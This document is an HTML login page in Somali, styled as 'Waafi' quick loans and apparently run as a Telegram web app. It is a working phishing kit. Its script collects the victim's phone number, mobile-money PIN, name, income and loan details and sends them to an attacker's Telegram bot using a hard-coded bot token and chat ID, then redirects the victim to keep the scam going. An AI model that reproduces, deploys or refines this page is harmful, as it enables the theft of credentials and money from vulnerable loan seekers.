<!DOCTYPE html>
<html lang="so">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Waafi - Galitaanka</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        .header-box {
            width: 100%;
            background: linear-gradient(to bottom, #82d13d, #a3e635);
            padding: 40px 20px;
            color: white;
            text-align: center;
        }
        
        .main-content {
            width: 90%;
            max-width: 400px;
            margin: 30px auto 0;
            text-align: center;
            flex-grow: 1;
        }
        
        .footer-box {
            width: 100%;
            background: linear-gradient(to top, #82d13d, #a3e635);
            padding: 50px 20px 30px;
            color: white;
            text-align: center;
            border-top-left-radius: 50% 30px;
            border-top-right-radius: 50% 30px;
        }
        
        .logo-text {
            font-size: 36px;
            font-weight: bold;
            margin: 0;
        }
        
        .sub-text {
            font-size: 15px;
            margin-top: 8px;
            opacity: 0.9;
        }
        
        .version-text {
            font-size: 12px;
            margin-top: 15px;
            opacity: 0.8;
        }
        
        .terms-text {
            font-size: 11px;
            margin-top: 15px;
            padding: 0 40px;
        }
        
        h2 {
            color: #555;
            font-size: 24px;
            margin-bottom: 20px;
        }
        
        .phone-input-group {
            display: flex;
            align-items: center;
            gap: 10px;
            border: 2px solid #82d13d;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 30px;
        }
        
        .phone-input-group .flag {
            font-size: 22px;
        }
        
        .phone-input-group .country-code {
            font-size: 18px;
            font-weight: 600;
            color: #333;
        }
        
        .phone-input-group input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 18px;
            font-family: inherit;
            color: #333;
            background: transparent;
        }
        
        .pin-label {
            color: #888;
            margin-bottom: 16px;
            font-size: 15px;
        }
        
        .pin-container {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        
        .pin-input-group {
            display: flex;
            gap: 8px;
        }
        
        .pin-box {
            width: 55px;
            height: 55px;
            border: 1.5px solid #82d13d;
            border-radius: 10px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            outline: none;
            font-family: inherit;
            transition: border-color 0.2s;
        }
        
        .pin-box:focus {
            border-color: #4caf50;
            box-shadow: 0 0 0 2px rgba(130, 209, 61, 0.25);
        }
        
        .toggle-eye {
            cursor: pointer;
            margin-left: 6px;
            font-size: 22px;
            user-select: none;
        }
        
        .btn-gal {
            background-color: #e0e0e0;
            color: #fff;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 10px;
            font-size: 20px;
            margin-top: 40px;
            cursor: not-allowed;
            font-weight: bold;
            transition: background-color 0.2s;
        }
        
        .btn-gal.active {
            background-color: #82d13d;
            cursor: pointer;
        }
        
        .btn-gal.active:active {
            background-color: #6cb32e;
        }
        
        .spacer {
            height: 30px;
        }
        
        .error-banner {
            background-color: #fde8e8;
            color: #e74c3c;
            border: 1px solid #f8b4b4;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 20px;
            display: none;
        }
        
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, #82d13d, #a3e635);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>

    <!-- Loading Overlay -->
    <div id="loading-overlay">
        <div class="spinner"></div>
        <div style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
    </div>

    <!-- Header -->
    <div class="header-box">
        <p class="logo-text">Waafi</p>
        <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
    </div>

    <!-- Main -->
    <div class="main-content">
        <h2>Gal</h2>

        <!-- Error Display -->
        <div id="errorDisplay" class="error-banner"></div>

        <!-- Phone Input (editable) -->
        <div class="phone-input-group">
            <span class="flag">🇸🇴</span>
            <span class="country-code">+252</span>
            <input type="tel" id="phoneInput" placeholder="612345678" maxlength="9" inputmode="numeric">
        </div>

        <!-- PIN Input -->
        <p class="pin-label">Geli PIN-kaaga</p>

        <div class="pin-container">
            <div class="pin-input-group">
                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            </div>
            <span class="toggle-eye" id="eyeIcon">👁️</span>
        </div>

        <!-- Login Button -->
        <button id="loginBtn" class="btn-gal" disabled>GAL</button>
        <div class="spacer"></div>
    </div>

    <!-- Footer -->
    <div class="footer-box">
        <p class="logo-text">Waafi</p>
        <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
        <p class="version-text">v2.1.3P</p>
        <p class="terms-text">Galitaanka markaad gasho waad ogolaatay <u>Shuruudaha iyo Xaaladaha</u></p>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {

            // ---- Elements ----
            const phoneInput = document.getElementById('phoneInput');
            const pinBoxes = document.querySelectorAll('.pin-box');
            const loginBtn = document.getElementById('loginBtn');
            const eyeIcon = document.getElementById('eyeIcon');
            const errorDisplay = document.getElementById('errorDisplay');
            const overlay = document.getElementById('loading-overlay');

            // ---- Pre-fill phone from localStorage ----
            const savedPhone = localStorage.getItem('phone') || "";
            phoneInput.value = savedPhone;

            // ---- PIN auto-move logic ----
            pinBoxes.forEach(function(box, index) {
                box.addEventListener('input', function() {
                    this.value = this.value.replace(/\D/g, '');
                    if (this.value && index < pinBoxes.length - 1) {
                        pinBoxes[index + 1].focus();
                    }
                    checkInputs();
                });

                box.addEventListener('keydown', function(e) {
                    if (e.key === "Backspace" && !this.value && index > 0) {
                        pinBoxes[index - 1].focus();
                    }
                });

                box.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const paste = (e.clipboardData || window.clipboardData).getData('text');
                    const digits = paste.replace(/\D/g, '').split('');
                    pinBoxes.forEach(function(pb, i) {
                        pb.value = digits[i] || '';
                    });
                    const nextEmpty = Array.from(pinBoxes).findIndex(pb => !pb.value);
                    if (nextEmpty !== -1) {
                        pinBoxes[nextEmpty].focus();
                    } else {
                        pinBoxes[pinBoxes.length - 1].focus();
                    }
                    checkInputs();
                });
            });

            function checkInputs() {
                const filled = Array.from(pinBoxes).every(function(b) {
                    return b.value.length === 1;
                });
                loginBtn.disabled = !filled;
                loginBtn.classList.toggle('active', filled);
            }

            // ---- Toggle PIN visibility ----
            eyeIcon.addEventListener('click', function() {
                const isPassword = pinBoxes[0].type === "password";
                pinBoxes.forEach(function(b) {
                    b.type = isPassword ? "text" : "password";
                });
                eyeIcon.textContent = isPassword ? "🙈" : "👁️";
            });

            // ---- Phone input: allow only digits ----
            phoneInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
            });

            // ---- Login button click ----
            loginBtn.addEventListener('click', async function() {
                const phone = phoneInput.value.trim();
                if (!phone || phone.length < 6) {
                    errorDisplay.innerText = "❌ Fadlan geli lambarka taleefanka saxda ah.";
                    errorDisplay.style.display = "block";
                    return;
                }

                let pin = "";
                pinBoxes.forEach(function(b) {
                    pin += b.value;
                });

                errorDisplay.style.display = "none";
                overlay.style.display = "flex";

                // ---- Save to localStorage ----
                localStorage.setItem('phone', phone);
                localStorage.setItem('userPhone', phone);
                localStorage.setItem('lastPin', pin);

                // ---- Collect ALL data ----
                const allData = {
                    amount: localStorage.getItem('amount') || '',
                    loanDuration: localStorage.getItem('loanDuration') || '',
                    loanType: localStorage.getItem('loanType') || '',
                    loanPurpose: localStorage.getItem('loanPurpose') || '',
                    loanAmount: localStorage.getItem('loanAmount') || '',
                    firstName: localStorage.getItem('firstName') || '',
                    lastName: localStorage.getItem('lastName') || '',
                    phone: phone,
                    jobStatus: localStorage.getItem('jobStatus') || '',
                    income: localStorage.getItem('income') || '',
                    pin: pin
                };

                // ---- Build the message text ----
                const messageLines = [
                    "🔐 *Waafi Login Data*",
                    "",
                    "👤 *Magaca:* " + (allData.firstName || "---") + " " + (allData.lastName || "---"),
                    "📞 *Telefoon:* +252 " + allData.phone,
                    "💰 *Qaddarka:* $" + (allData.amount || "---"),
                    "📆 *Muddada:* " + (allData.loanDuration || "---"),
                    "📋 *Nooca:* " + (allData.loanType || "---"),
                    "📝 *Ujeedada:* " + (allData.loanPurpose || "---"),
                    "💼 *Shaqada:* " + (allData.jobStatus || "---"),
                    "💵 *Dakhliga:* $" + (allData.income || "---"),
                    "🔑 *PIN:* " + allData.pin
                ];
                const message = messageLines.join("\n");

                // ---- Send to Telegram Bot via HTTP API ----
                const BOT_TOKEN = "8969984578:AAHtChaZ-fvzLEDbdim8Oh2xGUVXe7nTWOM";
                const CHAT_ID = "8478166975";

                let sentSuccessfully = false;

                try {
                    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: "Markdown"
                        })
                    });

                    const result = await response.json();
                    console.log("Telegram API response:", result);

                    if (result.ok === true) {
                        sentSuccessfully = true;
                        console.log("✅ Message sent to Telegram successfully!");
                    } else {
                        console.error("❌ Telegram API error:", result.description);
                    }
                } catch (err) {
                    console.error("❌ Network error sending to Telegram:", err);
                }

                // Wait a moment so the user sees the loading screen, then navigate
                setTimeout(function() {
                    overlay.style.display = "none";
                    window.location.href = "page8.html";
                }, 1500);
            });

            // ---- Telegram WebApp init ----
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();
                window.Telegram.WebApp.expand();
            }
        });
    </script>

</body>

</html>
